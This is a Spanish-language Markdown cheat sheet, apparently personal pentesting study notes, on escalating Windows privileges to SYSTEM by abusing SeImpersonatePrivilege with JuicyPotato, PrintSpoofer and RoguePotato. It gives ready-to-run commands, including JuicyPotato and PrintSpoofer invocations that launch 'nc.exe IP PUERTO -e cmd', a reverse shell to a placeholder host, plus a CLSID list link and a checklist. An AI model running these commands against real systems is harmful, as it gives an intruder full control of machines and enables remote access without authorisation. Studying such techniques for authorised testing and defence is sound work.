
## ðŸ”‘ Requisitos clave
- **SeImpersonatePrivilege**: permite suplantar el token de otro proceso.
- **SeAssignPrimaryTokenPrivilege**: permite asignar un token primario a un proceso.
- Estas capacidades se pueden usar para escalar de un servicio (como MSSQL o IIS) a **NT AUTHORITY\SYSTEM**.

## ðŸ§ª MÃ©todos de escalada utilizados

### 1. JuicyPotato

- **Funciona en**: versiones anteriores a Windows 10 1809 / Server 2019.
- **Requiere**: SeImpersonate o SeAssignPrimaryToken habilitado.
- **TÃ©cnica**: Abusa de DCOM/NTLM reflection para ejecutar comandos como SYSTEM.
- **Comando tÃ­pico**:
```cmd	
JuicyPotato.exe -l <puerto> -p <programa> -a "<argumentos>" -t * 
```

Ejemplo:
```cmd
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c nc.exe IP PUERTO -e cmd.exe" -t *
```
NOTA: Usa un  clsid por defecto, si no funciona usar uno buscando aquÃ­ hay una lista por sistema: https://ohpe.it/juicy-potato/CLSID/
Ejemplo:
```powershell
./juicy.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c nc.exe IP PUERTO -e cmd.exe" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```
### 2. PrintSpoofer (10 1809+ y Server 2019+)

- **Funciona en**: Windows 10 1809+ y Server 2019+ (donde JuicyPotato ya no sirve).
    
- **Requiere**: SeImpersonatePrivilege habilitado.
    
- **TÃ©cnica**: Abusa de privilegios de impresiÃ³n y llamadas a `CreateProcessAsUser()` para obtener SYSTEM.
    
- **Comando tÃ­pico**:

```cmd
PrintSpoofer.exe -c "nc.exe IP PUERTO -e cmd"
```

### 3. RoguePotato (mencionado brevemente)

- **Funciona en**: versiones modernas donde JuicyPotato no funciona.
    
- **Similar a**: JuicyPotato, pero con mejoras en la forma en que obtiene el token SYSTEM usando pipes anÃ³nimos y Named Pipe Impersonation.

## ðŸ“Œ Consideraciones

- Estas tÃ©cnicas suelen explotarse tras comprometer una aplicaciÃ³n que corre con permisos intermedios (como MSSQL o IIS).
    
- Siempre verificar los privilegios con `whoami /priv` antes de intentar la escalada.
    
- Elegir la herramienta correcta segÃºn la **versiÃ³n del sistema operativo**.